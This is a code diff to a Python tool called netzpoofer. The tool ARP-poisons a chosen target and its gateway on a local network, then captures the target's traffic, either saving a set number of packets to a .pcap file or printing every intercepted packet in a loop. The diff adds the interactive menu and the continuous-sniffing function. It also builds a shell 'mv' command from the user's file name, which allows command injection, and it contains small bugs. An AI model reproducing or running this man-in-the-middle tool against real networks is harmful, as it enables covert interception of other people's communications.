@@ -54,15 +54,41 @@ def netzpoofer():
     print('                            (_)                                     ')
     print('                            (_)                                     ')
 
+    print('')
+    print('[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]')
+    print('[*]                                                                  [*]')
+    print('[*] Select your computer network device                              [*]')
+    print('[*] Select the sniff target IP                                       [*]')
+    print('[*] Select your network gateway                                      [*]')
+    print('[*] Choose between saving or not the intercepted traffic             [*]')
+    print('[*]                                                                  [*]')
+    print('[*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*][*]')
+    print('')
+
     print('[*] All your network interfaces: ')
     os.system("iwconfig | grep wlan0")
+    print('-------------------------------------------------------------------')
     interface = input('Network Interface: ')   
     print('[*] All the possible targets in your network: ')
-    os.system("nmap -sn 192.168.0.0/24 | grep for")    
-    target_ip = input('Target IP: ')       
-    gateway_ip = input('Gateway IP: ')     
-    packet_count = int(input('Packet Limit: '))    
-    output_filename = input('Output Filename: ')      
+    os.system("nmap -sn 192.168.0.0/24 | grep for")
+    print('-------------------------------------------------------------------')
+    target_ip = input('Target IP: ')
+    print('[*] Is the gateway IP 192.168.0.1 ?')
+    gate = input('[Y/N] ')
+    if(gate == 'Y'):
+        gateway_ip = '192.168.0.1'
+    else:
+        gateway_ip = input('Gateway IP: ')
+    print('[*] Save intercepted packets in a .pcap file?')
+    gate = input('[Y/N] ')
+    if(gate == 'Y'):
+        packet_count = int(input('Number of packets to intercept: '))    
+        output_filename = input('Output Filename: ')
+        limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename)
+    else:
+        constant_sniff(interface, gateway_ip, target_ip)
+
+def limit_sniff(interface, gateway_ip, target_ip, packet_count, output_filename):
 
     conf.iface = interface    
     conf.verb = 0
@@ -89,11 +115,46 @@ def netzpoofer():
 
     try:      
         print ('[*] Starting sniffer for %d packets' % packet_count)
-        bpf_filter = 'ip host %s' %target_ip       
-        packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)    
-        wrpcap(output_filename, packets)       
+        bpf_filter = 'ip host %s' %target_ip
+        packets = sniff(count = packet_count, filter = bpf_filter, iface = interface)
+        wrpcap(output_filename, packets)
+        os.system("mv " + output_filename + " ./Files") 
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)     
 
     except KeyboardInterrupt:      
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)     
+        sys.exit(0)
+
+def constant_sniff(interface, gateway_ip, target_ip):
+    conf.iface = interface    
+    conf.verb = 0
+    print ('[*] Setting up %s' %interface)
+    gateway_mac = get_mac(gateway_ip)       
+    print(gateway_mac)
+
+    if gateway_mac is None:    
+        print ('[!!!] Failed to get gateway MAC. Exiting.')
+        sys.exit(0)
+    else:
+        print ('[*] Gateway %s is at %s') % (gateway_ip, gateway_mac)      
+
+    target_mac = get_mac(target_ip)   
+
+    if target_mac is None:     
+        print ('[!!!] Failed to get gateway MAC. Exiting.')
+        sys.exit(0)
+    else:
+        print ('[*] Target %s is at %s' % (target_ip, target_mac))      
+
+    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))      
+    poison_thread.start()    
+
+    try:      
+        print ('[*] Starting sniffer packets')
+        bpf_filter = 'ip host %s' %target_ip
+        while True:
+            packets = sniff(count = 1, filter = bpf_filter, iface = interface)
+            packets.show() 
+    except KeyboardInterrupt:      
+        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
         sys.exit(0)
